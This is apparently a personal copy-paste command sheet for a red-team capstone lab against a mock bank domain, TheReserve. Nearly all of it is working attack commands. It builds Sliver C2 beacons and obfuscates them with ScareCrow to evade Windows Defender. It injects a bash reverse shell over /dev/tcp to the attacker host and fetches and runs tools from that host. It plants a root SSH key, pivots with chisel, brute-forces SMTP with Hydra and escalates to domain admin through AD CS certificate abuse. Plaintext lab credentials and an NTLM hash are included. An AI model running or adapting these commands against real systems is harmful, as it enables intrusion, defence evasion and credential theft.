# Red-Team-Capstone-Challenge CMD-by-CMDs


[[Red-Team-Capstone-Challenge-Credentials]]
Replace the third octet IPs
```bash
sudo sed -i 's/.117./.117./g' /etc/hosts
sed 's/.117./.117./g' -i internalHosts.txt
sed 's/.114.111/.114.111/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
sed 's/.117./.117/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
```

```
The password policy for TheReserve is the following:

* At least 8 characters long
* At least 1 number
* At least 1 special character
* Special Characters: `  !@#$%^  `
```

```
ssh e-citizen@10.200.117.250
stabilitythroughcurrency

=======================================
Username: nvm
Password: PvH2VJqhnPMcbc0t
MailAddr: nvm@corp.th3reserve.loc
IP Range: 10.200.121.0/24
=======================================
```

Host management - update addDomainsToEctHosts.sh 
```bash
#!/bin/bash

echo "10.200.117.11 mail.thereserve.loc MAIL.thereserve.loc  " | sudo tee -a /etc/hosts
echo "10.200.117.12 thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.117.13 web.thereserve.loc WEB.thereserve.loc " | sudo tee -a /etc/hosts
# vpn key required
echo "10.200.117.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
echo "10.200.117.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.117.31 SERVER01.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.117.32 SERVER02.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.117.102 CORPDC.corp.thereserve.loc " | sudo tee -a /etc/hosts
```

Initial
```bash
curl http://10.200.121.13/october/themes/demo/assets/images/ -o images
cat images | cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
# Developer on the root webapge.
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
cat users.txt | awk '{print $1"@corp.thereserve.loc"}' >> emails.txt
echo "applications@corp.thereserve.loc" >> email.txt
crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
```

Silver and EDR bypassing Scarecrow
```go
// 
// remember to upx
// For VPN
generate --mtls 10.50.114.111:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
generate beacon --mtls 10.50.114.111:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
mtls -L 10.50.114.111 -l 11011
mtls -L 10.50.114.111 -l 11012

// Server 1
generate beacon --mtls 10.50.114.111:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
// ScareCrow to bypass Windows Defender - shoot fly with bozaka
./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
```

Chisel Organisation
```go
// remove glibc version issues be remove dependencies!
export CGO_ENABLED=0
go build -ldflags="-s -w"
// Edit proxychains file
sudo vim /etc/proxychains4.conf
socks5 $ip $port 
// VPN chisel server
./chisel server -p 20000 -reverse -socks -v


// VPN chisel Client - local pivot
nohup ./chisel client 10.50.114.111:20000 20001:127.0.0.1:20000 &
// 01-09 for individual VPN client pivots, socks, fowards
nohup ./chisel client 10.50.114.111:20000 R:127.0.01:20002:socks &


// 11-19 for individual * client pivots 

nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.114.111:20000 R:127.0.0.1:6379:172.19.0.2:6379 &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.114.111:20000 R:127.0.0.1: &
```


New
```bash
# https://stackoverflow.com/questions/711.117.bash-history-without-line-numbers
history | cut -c 8-
```

```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list


mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
mp32 --custom-charset1='!@#$%^' $WORD?1?d >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

Considerations
```
cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
```

```bash
# http://10.200.121.12/
mohammad.ahmed@corp.thereserve.loc

```

The play-by-play copy and paste 
```bash
ssh e-citizen@10.200.117.250
stabilitythroughcurrency
# login for flags
Username: nvm
Password: PvH2VJqhnPMcbc0t
# 

# Linux VPN
generate beacon --mtls 10.50.114.111:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN/VPN-update
# WRK01
generate beacon -m 10.50.114.111:11012 -b http://10.50.114.111:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin
# Serv0 foothold
generate beacon -m 10.50.114.111:11013 -b http://10.50.114.111:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/SRV1/Server01.bin
# DC foothold
generate beacon -m 10.50.114.111:11014 -b http://10.50.114.111:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/DC1/Backup.bin

mtls -L 10.50.114.111 -l 11011
mtls -L 10.50.114.111 -l 11012
mtls -L 10.50.114.111 -l 11013
mtls -L 10.50.114.111 -l 11014

# scarecrow the bin for server01 takes ages and cpu cries, with obfu
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain bing.com -obfu
# Became:
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 


/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/SRV1/Server01.bin -Loader binary -domain bing.com -obfu -Evasion KnownDLL 

/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/DC1/Backup.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 

# permissions
sudo chown -R kali:kali * && chmod +x *
# cd to  directory and build
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# UPX!
upx  *

# Start a listener, burpsuite and cmdi the vpn serve
python -m http.server 8443
rlwrap ncat -lvnp 36969 
;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.114.111/36969+<%261'
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
curl http://10.50.114.111:8443/chisel -o chisel
sudo cp authorized_keys /root/.ssh/authorized_keys
# If required
ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "10.200.117.12"
ssh -i vpn_root.rsa root@10.200.117.12
# Tools
curl http://10.50.114.111:8443/VPN-upgrade -o VPN-upgrade
# As root
nohup ./VPN-upgrade &

# As www-data
./chisel server -host 10.50.114.111 -p 20000 --reverse --socks5 -v
# On the VPN
chmod +x *
nohup ./chisel client 10.50.114.111:20000  R:20001:socks &
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5  127.0.0.1 20001
# rdp into server -1 
proxychains4 xfreerdp /u:lisa.moore /p:Scientist2006 /v:10.200.117.21
# Helpdesk
proxychains4 xfreerdp /u:laura.wood /p:'Password1@' /v:10.200.117.21
proxychains4 xfreerdp /u:mohammad.ahmed /p:Password1! /v:10.200.117.21
# google chrome http://10.50.114.111:8443/ 
# Download Word.exe 
# open powershell 

# AD CS Abuse

proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.117.102

proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.117.102 -ns 10.200.117.102
# First time will always timeout 
openssl x509 -in administrator_corpdc.pfx -text -noout
proxychains4 certipy-ad auth -dc-ip 10.200.117.102 -ns 10.200.117.102 -pfx administrator_corpdc.pfx
# Export the krbtgt
export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache

proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.117.102 Administrator@CORPDC.corp.thereserve.loc

# Linux beacon for later
curl http://10.50.114.111:8443/VPN-update -o VPN-update
nohup ./VPN-update &

```



## Installs

```bash
curl https://sliver.sh/install|sudo bash

sudo apt install thunderbird remmina neo4j ntpdate bloodhound certipy-ad -y
# 
# Authenicate
# ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
thunderbird
# nvm : nvm@corp.th3reserve.loc $somePassword
# Change the outbound server to 587

git clone https://github.com/r3nt0n/bopscrk.git
cd bopscrk;
pip3 install -r requirements.txt
python3 bopscrk.py -i

cd ~/RedTeamCapstoneChallenge
curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  

# Chisel building
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w" 
# Build for windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

```

Crying because of password changes
```bash
nohup nmap -sC -sV -p- 10.200.117.0/24 -oN vpn-free-lunch-sc-sv --min-rate 2000 & 
```